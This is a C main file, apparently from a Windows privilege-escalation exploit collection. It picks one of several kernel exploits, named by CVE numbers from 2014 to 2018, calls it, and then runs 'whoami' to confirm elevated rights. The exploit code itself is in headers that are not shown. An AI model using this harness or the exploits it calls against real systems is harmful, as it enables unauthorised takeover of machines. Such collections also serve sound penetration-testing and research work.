#include "CVE-2014-4113.h"
#include "CVE-2015-2546.h"
#include "CVE-2015-0057.h"
#include "CVE-2016-0095.h"
#include "CVE-2018-8120.h"

#define VUL_NAME "CVE-2018-8120"

int main()
{
	if (strcmp(VUL_NAME, "CVE-2014-4113") == 0)
	{
		if (Exploit_CVE_2014_4113())
		{
			printf("Exploit CVE-2014-4113 完成...\n");
			system("whoami");
		}
	}
	else if (strcmp(VUL_NAME, "CVE-2015-2546") == 0)
	{
		if (Exploit_CVE_2015_2546())
		{
			printf("Exploit CVE-2015-2546 完成...\n");
			system("whoami");
		}
	}
	else if (strcmp(VUL_NAME, "CVE-2016-0095") == 0)
	{
		if (Exploit_2016_0095())
		{
			printf("Exploit CVE-2016-0095 完成...\n");
			system("whoami");
		}
	}
	else if (strcmp(VUL_NAME, "CVE-2018-8120") == 0)
	{
		if (Exploit_CVE_2018_8120())
		{
			printf("Exploit CVE-2018-8120 完成...\n");
			system("whoami");
		}
	}


	system("pause");

	return 0;
}